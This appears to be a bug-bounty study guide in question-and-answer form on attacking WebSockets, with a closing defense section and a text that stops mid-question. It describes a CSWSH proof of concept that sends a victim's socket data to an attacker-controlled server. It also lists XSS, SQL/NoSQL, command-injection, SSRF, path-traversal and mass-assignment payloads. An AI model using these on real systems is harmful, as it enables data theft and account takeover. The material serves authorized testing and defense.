# WebSocket Security — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

**Author:** x8bitranjit

> A complete, in-depth study + field reference for **attacking WebSockets**: from "what is a WebSocket" to Cross-Site WebSocket Hijacking (CSWSH), message-layer injection (XSS/SQLi/cmdi/IDOR), per-message authorization flaws, rate-limit bypass, DoS, smuggling, and framework quirks (socket.io/SignalR/STOMP/graphql-ws). Q&A format, progressive difficulty, written as **"IF this → THEN that"** decision logic. Includes a beginner primer, tooling, methodology, real cases, **and** defense.
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, and learning. Prove CSWSH in a real browser with **your own** victim account, exfil to **your own** server; two own accounts for IDOR; measured counts for brute; measure-don't-flood for DoS.

**Canonical references** (real, read them):
- PortSwigger Web Security Academy — *WebSockets security vulnerabilities* (+ labs: manipulating messages, manipulating the handshake, **cross-site WebSocket hijacking**)
- OWASP WSTG — *Testing WebSockets*; RFC 6455 (WebSocket Protocol), RFC 7692 (`permessage-deflate`)
- CWE-1385 (Missing Origin Validation in WebSockets), CWE-346, CWE-352, CWE-319
- Burp WebSockets docs; `websocat` / `wscat` / Python `websockets`

---

## TABLE OF CONTENTS
- **Beginner primer — WebSockets in plain English** (P1–P8)
- **Level 0 — Fundamentals** (Q1–Q12)
- **Level 1 — Finding endpoints & baselining the handshake** (Q13–Q24)
- **Level 2 — CSWSH (Cross-Site WebSocket Hijacking)** (Q25–Q40)
- **Level 3 — Auth & authorization over WebSockets (IDOR/BFLA)** (Q41–Q52)
- **Level 4 — Message-layer injection** (Q53–Q66)
- **Level 5 — Rate-limit, transport, DoS, smuggling, frameworks** (Q67–Q82)
- **Level 6 — Expert chains & red-team** (Q83–Q90)
- **Tooling** (Q91–Q94)
- **Methodology & decision tree** (Q95–Q98)
- **Severity, validity & false positives** (Q99–Q105)
- **Real-world cases & references** (Q106–Q109)
- **Defense — how to secure WebSockets** (Q110–Q115)
- **Appendix — 60-second field checklist**

---

# BEGINNER PRIMER — WEBSOCKETS IN PLAIN ENGLISH

### P1. What is a WebSocket?
A **persistent, two-way connection** between a browser and a server. Instead of request→response, both sides can **push messages** anytime — that's how chat, live prices, notifications, and collaborative apps stay "live." The URL scheme is **`ws://`** (cleartext) or **`wss://`** (TLS, the secure one).

### P2. How does a WebSocket start?
As a normal HTTP request — the **handshake**: the browser sends `GET ... Upgrade: websocket`, the server replies `101 Switching Protocols`, and after that the same TCP connection carries **frames** (text/binary messages) instead of HTTP. In JS it's: `var ws = new WebSocket('wss://site/ws'); ws.onmessage = e => ...; ws.send('hi')`.

### P3. The one fact that makes WebSockets hackable?
**The Same-Origin Policy / CORS does NOT apply to WebSockets.** Any web page can open a socket to **any** host. The browser even **auto-attaches the target's cookies** to the handshake. So the *only* thing stopping a malicious site from opening your authenticated socket is the server **checking the `Origin` header** — which many don't (→ CSWSH).

### P4. What does a frame look like?
Usually JSON: `{"type":"chat","room":"general","text":"hi"}`. Some frameworks wrap it (socket.io sends `42["chat",{...}]`). You read/edit these in **Burp → Proxy → WebSockets** or **DevTools → Network → WS**.

### P5. Where do bugs live in a WebSocket app?
Two places: the **handshake** (is auth a cookie? is `Origin` checked? is it `wss`?) → that's the **CSWSH / transport** game; and the **messages** (auth is often checked only at connect, and message fields aren't validated) → that's the **IDOR / injection** game.

### P6. Why is CSWSH worse than CSRF?
CSRF makes the victim's browser *send* a request but the attacker **can't read the response** (SOP blocks it). With a WebSocket, the attacker's JS opens the socket and **receives the messages back** — so CSWSH **steals data**, not just fires blind actions. Same precondition (cookie auth, no anti-CSRF), bigger impact.

### P7. How do I even test one?
Open **Burp → WebSockets** (it logs every frame once you browse through Burp), or **DevTools → Network → WS**. To poke the handshake from the command line use **`websocat`** or **`wscat`** (you can set `Origin` and `Cookie`). To prove CSWSH, host a tiny HTML page (`new WebSocket(...)`) on a *different* site and open it while logged in.

### P8. One-sentence mindset?
**Read the handshake (cookie? Origin? wss?), then treat every message as untrusted input to the backend** — CSWSH if the handshake is weak, injection/IDOR if the messages are.

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What's the WebSocket handshake, exactly?
An HTTP `GET` with `Upgrade: websocket`, `Connection: Upgrade`, `Sec-WebSocket-Key`, `Sec-WebSocket-Version: 13`, optional `Sec-WebSocket-Protocol`, and `Origin`. The server returns `101 Switching Protocols` + `Sec-WebSocket-Accept`. After that, it's frames, not HTTP.

### Q2. Does CORS protect WebSockets?
**No.** CORS governs cross-origin *reads* of HTTP responses; it doesn't apply to WebSockets at all. A page can open a WS to any host. The server's own `Origin`-header check is the only cross-origin gate.
> *Plain version:* the phone company lets **any website dial any number**, and the caller's badge (cookies) rides along automatically. The usual guard that stops other sites reading your data simply isn't posted on this line. The one thing that can stop a stranger's site is the *callee* checking the "where are you calling from" stamp (`Origin`) — and many never do.

### Q3. Are cookies sent on the WS handshake?
**Yes** — the handshake is an HTTP request to the target host, so the browser attaches that host's cookies automatically (subject to `SameSite`). This is why cookie-authenticated sockets are CSWSH-able.

### Q4. What's CSWSH in one sentence?
**Cross-Site WebSocket Hijacking** — an attacker page opens the victim's authenticated WebSocket (cookie auto-attached, `Origin` unchecked) and reads/sends messages as the victim. CSRF that can also read responses.
> *Plain version:* an evil site makes the victim's browser **dial the target as the victim** (badge attached, no Origin check) and holds a live two-way call — asking for the victim's private data *and hearing the answers*, and giving orders as them.

### Q5. What are the main WebSocket bug classes?
CSWSH (handshake/Origin), authorization-over-WS (IDOR/BFLA per message), message injection (XSS/SQLi/NoSQLi/cmdi/SSRF), rate-limit bypass, transport (`ws://`/token-in-URL), DoS, and smuggling/proxy misconfig.

### Q6. Why are WebSocket bugs commonly missed?
Testers (and scanners) watch the HTTP traffic; the WebSocket frames hide in a separate Burp tab nobody opens. And the message handlers often skip the validation/authz the HTTP layer does.

### Q7. query/HTTP vs WebSocket auth — what changes?
HTTP re-authenticates each request; a WebSocket is authenticated **once at connect** and then the connection is trusted — so **per-message** authorization is frequently absent (→ IDOR/BFLA by editing message ids).
> *Plain version:* the server checks your badge when you *dial*, then never re-checks it for each *sentence* on the call. So mid-conversation you can say "read me #124" or "act on account B" and it just obeys — that's IDOR/BFLA over the phone line.

### Q8. Can a WebSocket cause RCE?
Yes — if a **message field** reaches a shell/deserializer/template/query on the backend (cmdi, insecure deserialization of a binary frame, SSTI, SQLi-stacked). The WS is just a tunnel to the same dangerous sinks.
> *Plain version:* the phone line is just a **tunnel to the backend**, and the input-cleaning done on the site's normal forms is often missing on the message handlers. So whatever you say down the line can hit a shell, a database, or a deserializer — the same RCE/dump sinks as HTTP, through a door left unlocked.

### Q9. What's the real-world impact range?
Low (cleartext `ws://` on a public feed) → Critical: CSWSH→ATO/private-data theft, message injection→RCE/DB-dump/stored-XSS, IDOR/BFLA over WS, rate-limit-bypass→ATO.

### Q10. `ws://` vs `wss://`?
`wss://` is WebSocket over TLS (encrypted). `ws://` is cleartext → handshake cookies and all frames are sniffable/MITM-able. Auth/PII over `ws://` is a finding (CWE-319).

### Q11. What single thing makes a CSWSH report valid?
A **cross-origin, authenticated connect proven in a real browser** that reads data or changes state — with auth being a **cookie** the browser auto-sends and the server **not validating `Origin`**.

### Q12. What's the attacker mindset?
For every socket: *"Can a random website open this as the logged-in victim (cookie + no Origin check)? And once connected, what message can I send to read or do something I shouldn't?"*

---

# LEVEL 1 — FINDING ENDPOINTS & BASELINING THE HANDSHAKE

### Q13. How do I find WebSocket endpoints?
DevTools → Network → **WS** filter; grep JS for `new WebSocket(`/`io(`/`SockJS(`/`signalr`/`wss://`; Burp's **WebSockets** history; common paths `/ws`, `/socket.io/`, `/cable`, `/hub`, `/graphql`, `/stomp`, `/live`.

### Q14. How do I confirm and capture frames?
Browse the app through Burp; the WebSockets tab logs the handshake + every frame. Or DevTools → Network → WS → Messages. Save a clean handshake and a few representative messages.

### Q15. What do I read off the handshake first?
**Three things:** (1) is auth a **`Cookie`** (auto-sent) or a **token** the JS adds? (2) is **`Origin`** validated? (3) is it **`wss`**? These decide CSWSH, transport, and which attacks are viable.

### Q16. How do I tell cookie-auth from token-auth?
Look at the handshake request: a `Cookie:` header that carries the session = cookie auth (CSWSH-relevant). A token in the **URL** (`?token=`), a **`Sec-WebSocket-Protocol`** bearer, or a **first message** (`{"type":"auth","token":...}`) = token auth (CSWSH usually N/A).

### Q17. How do I quickly test Origin handling?
From `websocat`/`wscat`, connect with the **victim cookie** and a **foreign `Origin`**. If it stays authenticated → no Origin check → CSWSH-able (confirm in a browser).

### Q18. What's the "message map" and why build it?
A list of every message type and whether it carries an **id**, **changes state**, is **rendered to others**, or **hits the backend**. It tells you which frames to attack for IDOR (ids), state-change/ATO (actions), stored-XSS (rendered), and injection (backend).

### Q19. Should I test message handlers logged-out?
Yes — connect with **no auth** and try message types; some servers accept "subscribe/join/read" messages pre-auth → unauth data leak.

### Q20. Why baseline before attacking?
Because the auth model decides everything: cookie+no-Origin → go for CSWSH; token-auth → skip CSWSH, attack messages; per-message authz missing → IDOR; fields hitting backend → injection.

### Q21. Does SameSite affect CSWSH?
Yes — like CSRF, the cookie must actually be sent on the cross-site handshake. `SameSite=None` → sent (CSWSH works); `Lax/Strict` → the cross-site WS handshake (a background connection, not a top-level navigation) generally **won't** carry the cookie → CSWSH blocked unless you have a same-site position. Check the cookie's SameSite (CSRF kit).

### Q22. What frameworks change the framing?
socket.io (`42["event",{...}]`), SignalR (`/negotiate` then `/hub`), STOMP (`SEND`/`SUBSCRIBE` frames), SockJS (fallbacks), graphql-ws (`connection_init`/`subscribe`), ActionCable (`/cable`). Recognise it so you tamper the right structure (Q78–Q82).

### Q23. Where are WS endpoints most sensitive?
Chat/messaging (private data + stored XSS), trading/wallet feeds (state change), collaborative editors (IDOR), admin/live dashboards (BFLA), notifications (data leak).

### Q24. What's the deliverable from recon/baseline?
`endpoint | auth (cookie/token) | Origin-checked? | wss? | message types (id/action/rendered/backend)` — your test plan.

---

# LEVEL 2 — CSWSH (CROSS-SITE WEBSOCKET HIJACKING)

### Q25. What are the exact preconditions for CSWSH?
(a) auth is a **cookie** the browser auto-sends, (b) the server **doesn't validate `Origin`**, (c) the cookie is sent cross-site (`SameSite=None` or a same-site position). All three → an attacker page hijacks the socket.

### Q26. How do I prove CSWSH (the right way)?
Host an HTML page on **your** origin that does `new WebSocket('wss://target/ws')` and `onmessage → fetch('//you/leak?d='+data)`. Open it in a browser **logged into your victim test account**. If your server receives the victim's private messages → CSWSH confirmed (real-browser, cross-site).

### Q27. Why isn't a `websocat`/curl connect enough proof?
CLI clients ignore the Same-Origin Policy and don't behave like a browser, so "websocat connected with a foreign Origin" is only an **oracle**. The actual attack is a **browser** opening the socket cross-site — prove that.
> *Plain version:* a command-line tool will dial *any* number with *any* caller-ID stamp — it's not bound by the rules a real browser follows, and it doesn't carry a real victim's badge. So a `websocat` connect only tells you the callee *probably* won't check the stamp; the real proof is a genuine **browser**, logged in as the victim, dialing from the attacker's page. Show that.

### Q28. CSWSH vs CSRF — concrete difference?
Both ride the victim's cookie. CSRF is **write-only/blind** (SOP hides the response). CSWSH **reads the responses** (they arrive on the attacker's socket) → it leaks data *and* can act → usually higher severity.

### Q29. The server checks `Origin` — am I done?
Not necessarily — try the **CORS-style allow-list bypasses**: `target.com.evil.com`, `eviltarget.com`, `target.com.evil`, a **subdomain you control or can XSS**, `null` (sandboxed iframe), trailing dot, case tricks. Any accepted foreign-ish origin = CSWSH.

### Q30. What can I do once the socket is hijacked?
Send the app's "load my data" messages and exfil the replies (private-data theft), and send **state-changing** messages as the victim (change email → reset → **ATO**, transfer, post, change settings).

### Q31. How do I turn CSWSH into ATO?
Over the hijacked socket, send the "change email/recovery" message → trigger a password reset → it goes to the attacker inbox → log in as the victim. You can even read the confirmation message over the socket.

### Q32. Does CSWSH work if auth is a Bearer token in the WS URL?
No — the attacker's cross-site JS can't know the victim's token to put in the URL, so it can't authenticate the hijacked socket. That's why **cookie auth** is the CSWSH precondition. (Report it only if the token is somehow obtainable cross-site.)

### Q33. The socket needs a `Sec-WebSocket-Protocol` token — CSWSH?
The browser WebSocket API lets JS set subprotocols, but if it must contain a **secret token** the attacker doesn't have, CSWSH fails. If the subprotocol is non-secret (just `"chat"`), CSWSH still works.

### Q34. What if the app sends a CSRF token in the first message?
If the socket requires a **server-issued anti-CSRF token** (that the attacker can't read cross-origin) in the handshake or first frame, CSWSH is mitigated. Test whether the token is actually required/validated.

### Q35. Can CSWSH read historical data or only live?
Whatever the socket will return — many apps reply to a "get history/conversations/account" message with the full record, so CSWSH often dumps **historical private data**, not just new live messages.

### Q36. How does SameSite=Lax affect my CSWSH PoC?
A cross-site WS handshake is a background sub-resource request, so under `Lax`/`Strict` the session cookie usually **isn't** attached → no auth → no CSWSH. You'd need `SameSite=None` or a same-site origin (a subdomain XSS/takeover). Always check the cookie first (CSRF kit §4).

### Q37. Is "no Origin validation" alone reportable?
On its own it's weak/Info unless you can show the **impact** (a cross-site page reading/acting as the victim). Bundle the missing-Origin-check **with** the data theft / ATO it enables.

### Q38. How do I write the cleanest CSWSH PoC?
A few lines: `new WebSocket`, `onopen → send(read+stateChange)`, `onmessage → fetch to your server`. Host cross-site, open as the victim, capture the leak on your server. (See `poc/cswsh_poc.html`.)

### Q39. Can CSWSH be unauthenticated-impactful?
If the socket exposes sensitive data/actions **without** auth, that's an auth-bypass (Q43) rather than CSWSH — but CSWSH specifically abuses the **victim's** authenticated session from another site.

### Q40. CSWSH severity?
High/Critical when it yields private-data theft or ATO (`UI:R` since the victim opens the page, but scope-changed + high confidentiality). Lower if the socket exposes little. Lead with what it reads/does.

---

# LEVEL 3 — AUTH & AUTHORIZATION OVER WEBSOCKETS (IDOR/BFLA)

### Q41. What's the most common authz flaw over WS?
**No per-message authorization.** The connection is authenticated at connect, then every message is trusted — so referencing **another user's id** in a frame reads/acts on their data (IDOR over WS).

### Q42. How do I test IDOR over WS?
Two accounts: connect as **A**, send a frame with **B's** id (`{"type":"getMessages","conversationId":<B>}`). If B's data comes back → IDOR. (Use the IDOR kit's two-account proof.)

### Q43. What's an auth bypass over WS?
A socket (or specific message types) that resolve **without authentication** — connect with no cookie/token and see which "read/subscribe/action" messages still work → unauth data/action.

### Q44. What's BFLA over WebSockets?
Invoking a **privileged message type** as a normal user — `{"type":"adminBroadcast"}`, SignalR privileged hub methods, an admin channel subscription. Function-level authz missing on the message handler.

### Q45. Pub/sub channel authorization?
Apps using channels/topics (STOMP, ActionCable, Phoenix, MQTT) let you **subscribe**. Subscribe to **another user's** channel (`user.<B>`) or `admin`/`tenant.<other>` — if you receive their stream, it's broken channel authz (cross-tenant IDOR).

### Q46. Does the socket die when the user logs out?
Often not. Test: log out / revoke the token, then keep using the socket. If it still works → broken session lifecycle (a token/session that outlives revocation).

### Q47. Can I combine CSWSH with IDOR?
Yes — hijack the victim's socket (CSWSH) *and* send messages that reference other objects; or use CSWSH to reach actions, IDOR to widen the targets. Chain for maximum data/impact.

### Q48. How do I prove an authz-over-WS bug validly?
Two of your own accounts (A reaches B's data/action), reproducible — exactly the IDOR rule. For BFLA, a low-priv account performing a privileged message action.

### Q49. Why is per-message authz forgotten so often?
Because the framework authenticates the connection once; developers assume "connected = allowed" and don't re-check object ownership/role on each message. It's the WS analogue of REST BOLA.

### Q50. Are there mass-assignment bugs over WS?
Yes — an `update`/`save` message that accepts extra fields: `{"type":"updateProfile","role":"admin","isAdmin":true}`. Read it back; if `role` sticks → priv-esc (IDOR kit §9).

### Q51. What's the highest-value authz-over-WS target?
A message that reads **another user's private data at scale** (enumerate ids) or performs an **admin/privileged action** — i.e. IDOR→mass-data or BFLA→admin.

### Q52. Severity for IDOR/BFLA over WS?
Same drivers as REST IDOR/BFLA: data sensitivity × read/write × who the victim can be. Cross-user private-data read or privileged action = High/Critical.

---

# LEVEL 4 — MESSAGE-LAYER INJECTION

### Q53. Why test injection on WebSocket messages at all?
Because the frame fields flow into the same backends as HTTP params — DB queries, shells, templates, outbound requests, other users' DOM — but the message handler usually **skips** the validation/encoding the HTTP layer applied.
> *Plain version:* the phone line is a **tunnel to the same rooms** the HTTP forms reach — but developers guard the front door and forget the line. So the injection payloads that get blocked on the website's forms often sail straight through as messages. Same attacks, a door left unlocked.

### Q54. How do I find stored XSS over WS?
In chat/comment/notification apps, the text you send is **rendered in other users' browsers**. Send `<img src=x onerror=...>` / `<svg onload=...>` in a frame; if it executes in a **recipient's** session → stored XSS over WS → session/ATO (XSS kit).

### Q55. How do I test SQLi/NoSQLi over WS?
Put payloads in search/filter/id fields: `{"q":"' OR 1=1-- -"}`, `{"id":{"$ne":null}}`. Error/UNION/time-based / response-diff as usual → data dump / auth bypass.

### Q56. Command injection / SSRF over WS?
A field reaching a shell or outbound fetch: `{"convert":"pdf; sleep 10"}` (time-based RCE), `{"fetchUrl":"http://169.254.169.254/..."}` (SSRF→metadata). Use interactsh to confirm blind.

### Q57. How do I edit/resend a frame in Burp?
Burp → Proxy → WebSockets: intercept a frame and edit it, or right-click → resend an edited copy on the live connection. You can also script with Python `websockets`.

### Q58. Path traversal / LFI over WS?
A "download/preview/file" message: `{"file":"../../../../etc/passwd"}` → file read via the resolver. Chain with the LFI/File-Upload kits.

### Q59. Deserialization over WS?
If frames are **binary** (protobuf, MessagePack, Java/.NET serialized), decode and tamper. Serialized-object messages can be **insecure deserialization → RCE** — a top-tier outcome.

### Q60. Type juggling / schema confusion over WS?
Send arrays/objects where a scalar is expected, extra/unknown fields, or malformed frames — to drop a filter, mass-assign, or trip the parser into an exploitable state.

### Q61. Is WS injection higher or lower severity than HTTP injection?
Same — severity is the **downstream class** (RCE/SQLi-dump/stored-XSS), not the transport. Lead with that, note it was reached via the WebSocket.

### Q62. How do I confirm WS injection isn't a false positive?
A reproducible signal: the XSS fires in a **recipient's** browser; a SQL error/UNION/time delta; an **OOB** callback you control. A one-off error isn't proof.

### Q63. Can WS messages bypass a WAF?
Sometimes — WAFs tuned for HTTP query/body params may not inspect WebSocket frames, so payloads ride through unfiltered. Don't rely on it, but it's worth trying frames when HTTP is blocked.

### Q64. Where do injectable WS fields cluster?
Search/filter, "convert/export/render", file/preview, URL/import/avatar (SSRF), and any field echoed to other users (XSS).

### Q65. Stored XSS via WS — why is it so impactful?
It executes in **other users'** (often many users', or an admin's) browsers automatically as they receive the live message → session theft / ATO / worm-like spread in chat rooms.

### Q66. CWE for WS message injection?
The injection's own CWE: XSS 79, SQLi 89, NoSQLi 943, cmdi 77/78, SSRF 918, path traversal 22, deserialization 502. Plus CWE-20 (improper input validation) on the message handler.

---

# LEVEL 5 — RATE-LIMIT, TRANSPORT, DoS, SMUGGLING, FRAMEWORKS

### Q67. How does WS bypass rate limits?
HTTP rate-limiters count HTTP requests; a WebSocket carries **many messages on one connection**, so a login/OTP gate throttled over HTTP is often **unlimited over the socket** → brute → ATO. Prove with a measured accepted-count.

### Q68. How do I demonstrate the rate-limit bypass safely?
Show **more attempts processed** on one socket than the HTTP cap (e.g. cap 5, but 50 accepted) — that's the proof. Don't actually crack a real account; bound the count; use your own account.

### Q69. What's the risk of `ws://` (cleartext)?
Handshake cookies and all frames travel unencrypted → sniffing/MITM → token/PII theft. Report (CWE-319), severity by what it carries.

### Q70. Why is a token in the WS URL bad?
URLs are logged (server/proxy logs, browser history, `Referer`, analytics) → token leakage. Auth belongs in the handshake, not the query string (CWE-598/200).

### Q71. WebSocket DoS vectors?
Connection exhaustion (open many, never close), oversized/fragmented frames, and the **`permessage-deflate` decompression bomb** (a tiny compressed payload expands huge server-side). Measure with permission; never sustain an outage.

### Q72. What's a permessage-deflate bomb?
If the server negotiates the compression extension (RFC 7692), a highly-compressible small frame can **decompress to a massive buffer** server-side → memory DoS — the WS analogue of a zip bomb. Report missing decompressed-size limits.

### Q73. WebSocket smuggling?
Reverse proxies that mishandle `Upgrade`/`Connection` (esp. HTTP/2→1.1 downgrades, h2c) can let a crafted upgrade **smuggle** past front-end controls or tunnel to internal services. Advanced — cross-ref the Request Smuggling kit.

### Q74. Proxy/gateway misconfig?
A gateway meant to enforce auth/Origin on `/ws` may not, while the backend trusts it — leading to header-spoofed or direct-to-backend connects, or exposed internal WS endpoints.

### Q75. socket.io specifics?
Handshake at `/socket.io/?EIO=4&transport=websocket`; messages framed `42["event",{...}]` — tamper inside the JSON array. It's a WS underneath, so CSWSH and message attacks apply; older versions had Origin/`allowRequest` gaps.

### Q76. SignalR specifics?
A `/negotiate` HTTP call issues a `connectionToken`, then a WS **hub**. Test the negotiate auth and **hub-method authorization** (invoke privileged methods as low-priv → BFLA).

### Q77. STOMP over WS specifics?
Frames like `SEND`/`SUBSCRIBE` with a `destination:` header → **subscribe to other users'/admin destinations** (broken pub/sub authz), and header injection in STOMP frames.

### Q78. SockJS specifics?
Falls back to XHR/EventSource/long-polling when WS is unavailable — test those fallback transports' Origin/CSRF handling too, not just the WS path.

### Q79. graphql-ws / GraphQL subscriptions?
Subscriptions run over WS (`connection_init`+`subscribe`) → CSWSH + GraphQL BOLA over the socket. See `API/GraphQL/` §15.5.

### Q80. ActionCable / Phoenix Channels / MQTT-over-WS?
All carry channel/topic subscriptions and per-channel auth — test subscribing to channels you shouldn't (cross-user/admin/tenant).

### Q81. How do I tamper framework-wrapped frames?
Decode the wrapper first (socket.io `42[...]`, STOMP headers, protobuf), edit the inner payload, re-encode, resend. Burp shows the raw frame; some extensions help decode socket.io.

### Q82. Do these frameworks change the CSWSH test?
No — they're WebSockets underneath, so the same handshake/Origin/cookie analysis applies; just account for their handshake quirks (e.g. SignalR's negotiate, socket.io's EIO handshake).

---

# LEVEL 6 — EXPERT CHAINS & RED-TEAM

### Q83. What's the strongest WebSocket chain?
**Message injection → RCE** (cmdi/deserialization on a frame field) or **CSWSH → private-data theft + ATO**. Both Critical; lead with whichever you can prove.

### Q84. How do I chain CSWSH → ATO end to end?
Confirm CSWSH (cookie + no Origin) → real-browser PoC → over the hijacked socket send "change email" → reset → log in as victim → demonstrate on your own victim account.

### Q85. How do I chain stored-XSS-over-WS → worm/admin?
A chat message XSS executes in every recipient (and admins reading the room) → steal sessions / perform actions; in a multi-user room it can self-propagate (describe, don't deploy, a worm — keep it benign).

### Q86. How do red-teamers use WebSockets?
Quiet data exfil via CSWSH (one link), lateral movement via IDOR-over-WS, and reaching internal services via WS smuggling/proxy gaps — all low-noise relative to loud HTTP fuzzing.

### Q87. How do I combine WS bugs with other kits?
CSWSH ← CSRF/SameSite gate + CORS Origin-bypass tricks; message IDOR ← IDOR two-account method; stored-XSS-over-WS → XSS escalation; URL-field SSRF → SSRF→cloud; binary frame → deserialization→RCE.

### Q88. When is a WS finding NOT worth chasing?
"No Origin check" with **token auth** (no real CSWSH), Origin reflection with no sensitive data/action, self-XSS to yourself, `ws://` on a public unauth feed, theoretical DoS. Don't inflate.

### Q89. How do I quantify impact for the report?
State **what the socket can read** (private data / how much) and **what it can do** (state change / ATO / admin / RCE), and **who the victim can be** — that's the severity story.

### Q90. What's the most impressive WS outcome to demonstrate?
A single attacker link that, when a logged-in victim opens it, silently **dumps their private messages and takes over their account** (CSWSH→ATO) — or a chat frame that **executes code on the server** (message→RCE).

---

# TOOLING

### Q91. What's the core WebSocket toolkit?
**Burp** (WebSockets history, intercept/edit/resend frames, CSWSH PoC generator) · **DevTools → Network → WS** · **websocat/wscat** (CLI, set Origin/Cookie) · Python **websockets** (scripting/fuzz/brute) · a host for the CSWSH page.

### Q92. How do I script WS attacks?
Python `websockets`/`aiohttp`: connect with chosen headers, loop frames (fuzz/brute), read replies. The `poc/ws_client.py` and `ws_ratelimit_test.py` helpers do exactly this benignly.

### Q93. Anything for framework-specific testing?
graphql-cop flags WS CSRF on graphql-ws; socket.io/SignalR have their own clients you can repurpose; STOMP libs to craft frames. Mostly it's Burp + a CLI client + knowing the framing.

### Q94. How do I generate a CSWSH PoC fast?
Burp Engagement tools can generate one, or use the `poc/cswsh_poc.html` template — change the target URL, the read message, and your exfil server.

---

# METHODOLOGY & DECISION TREE

### Q95. Give me the end-to-end methodology.
Find sockets → baseline the handshake (cookie/token, Origin, wss, message map) → CSWSH → per-message authz/IDOR/BFLA → message injection → rate-limit/transport/DoS/framework → validate → severity → report.

### Q96. The decision tree in words?
Found a ws(s)? → cookie auth + no Origin check? → CSWSH (real-browser proof) → read+act → ATO. Token auth? → skip CSWSH, attack messages. Connected? → swap B's id (IDOR), privileged type (BFLA), inject fields (XSS/SQLi/cmdi), brute (rate-limit).

### Q97. How do I prioritise?
Message injection (RCE/dump) and CSWSH→ATO first; then IDOR/BFLA; then rate-limit; then transport/DoS. And by data sensitivity of what the socket carries.

### Q98. How do I avoid wasting time?
Baseline first — if auth is a token (no CSWSH) and messages are well-authorized & validated, move on. Spend time where the handshake is cookie+no-Origin or the message handlers are unguarded.

---

# SEVERITY, VALIDITY & FALSE POSITIVES

### Q99. What's the validity bar per sub-bug?
CSWSH → cross-origin authed connect proven in a real browser (cookie auth + no Origin check) reading/acting. IDOR/BFLA → two-account data-back. Injection → executed payload/OOB. Rate-limit → measured count. Transport → carries auth/PII.

### Q100. Classic WebSocket false positives?
"No Origin check" with **token auth**; websocat-only CSWSH; Origin reflection with no sensitive data/action; self-XSS; `ws://` on a public feed; theoretical DoS without measurement.

### Q101. How do I set severity?
By what the socket can **read** and **do** × victim reach. Injection→RCE = Critical; CSWSH→ATO/data-theft = High/Critical; stored-XSS = High; IDOR/BFLA = per sensitivity; transport = Medium.

### Q102. What CWE do I cite for CSWSH?
**CWE-1385** (Missing Origin Validation in WebSockets) + **CWE-346** (Origin Validation Error), related **CWE-352** (CSRF). Message-layer uses the injection/IDOR CWEs.

### Q103. How do I title a WebSocket report?
`<sub-bug> on <ws endpoint> → <impact>` and lead with impact + the real-browser/two-account proof. Never "WebSocket misconfig" or "no Origin check" alone.

### Q104. How do I handle "no Origin check" in the report?
As the **mechanism**, bundled with the impact it enables (data theft / ATO). On its own it's weak; with a real-browser CSWSH PoC it's High/Critical.

### Q105. How do I de-duplicate?
One strong CSWSH→ATO or message-injection beats a pile of "no Origin check / ws:// " notes. If the program knows about a missing Origin check, report your **distinct impact**.

---

# REAL-WORLD CASES & REFERENCES

### Q106. What does PortSwigger teach (and lab)?
Three pillars: **manipulating WebSocket messages** to exploit vulns (e.g. XSS via a chat message), **manipulating the handshake** (e.g. spoofing `X-Forwarded-For`/headers, bypassing auth), and **cross-site WebSocket hijacking** — the canonical CSWSH lab (steal the victim's chat history).

### Q107. What are common disclosed WebSocket bugs?
CSWSH leaking chat/account data or enabling ATO; stored XSS via chat messages; IDOR/BFLA over message handlers; rate-limit bypass over WS; socket.io/SignalR Origin & hub-authz gaps.

### Q108. What's the common thread?
The handshake's `Origin` isn't checked (CSWSH) **or** the message handlers trust the connection and the field contents (IDOR/injection). Same root as CSRF/IDOR — just over a socket.

### Q109. Where can I practice?
PortSwigger WebSockets labs (message-manipulation, handshake-manipulation, CSWSH), deliberately-vulnerable chat apps, and your own socket.io/SignalR test app.

---

# DEFENSE — HOW TO SECURE WEBSOCKETS

### Q110. The top fix?
**Validate the `Origin` header** at the handshake against an allow-list (and/or require a CSRF token in the handshake). This kills CSWSH.

### Q111. How do I stop CSWSH specifically?
Don't auth WebSockets by **ambient cookies** across sites — use an explicit token the client presents; set the session cookie `SameSite=Lax/Strict`; check `Origin`; require an anti-CSRF token on the handshake.

### Q112. How do I stop authz-over-WS bugs?
Enforce **authorization on every message** (re-check object ownership / role / channel membership per frame), not just at connect; expire the socket on logout/token-revocation.

### Q113. How do I stop message injection?
Validate & encode every field server-side: parameterized queries, output-encode anything rendered to other users, allow-list URLs, no shell, safe deserialization, allow-list bindable fields.

### Q114. How do I stop rate-limit bypass & DoS over WS?
Per-**message** rate-limiting (not per-connection); max frame/message size; max connections per IP/user; decompressed-size caps for `permessage-deflate`; ping/pong idle timeouts.

### Q115. Transport hardening?
`wss://` only (no `ws://`); tokens in the handshake, never the URL; reject mixed content; proper reverse-proxy `Upgrade` handling to prevent smuggling.

---

# LEVEL 7 — INTERVIEW (explain it out loud)

> Crisp, senior-sounding answers for an AppSec/pentest interview or a bounty-team screen. WebSockets separate people who understand *why the same-origin policy doesn't save you here* from people who just know "there's a `ws://`".

### Q116. In one sentence, what makes WebSockets a distinct attack surface?
A WebSocket is a **persistent, bidirectional channel** opened by an HTTP **handshake** and then carrying raw frames — so it has *two* surfaces HTTP testers under-cover: **who is allowed to open the socket** (the handshake — CSWSH, Origin, per-message authz) and **the message layer** (every frame is untrusted input, often flowing **past the WAF and out of the request logs** that only inspect HTTP).

### Q117. What is CSWSH and what's its root cause?
**Cross-Site WebSocket Hijacking** (Christian Schneider, 2013) is **CSRF on the WebSocket handshake**. The handshake is a normal HTTP request that carries cookies, but the browser doesn't apply CORS read-restrictions to it the way it does to `fetch`. So if the server authenticates the handshake with a **cookie alone**, checks **no `Origin`** and requires **no CSRF token**, an attacker's page can open `new WebSocket("wss://victim/…")`, the browser attaches the victim's cookie, and the socket connects **in the victim's session** — the attacker's JS then reads and sends messages as the victim.

### Q118. Why is CSWSH usually worse than classic CSRF?
Classic CSRF is **write-only and blind** (you fire a request but can't read the response cross-origin). CSWSH is **bidirectional**: the attacker's page **reads** everything the server streams — chat history, notifications, the account's data, and frequently a **session/API token** the app sends on connect — *and* can **send** messages (state change) as the victim. Read + write in the victim's session is **data theft + ATO**, not just a forged action.

### Q119. How do you test for CSWSH, and what's the validity gate?
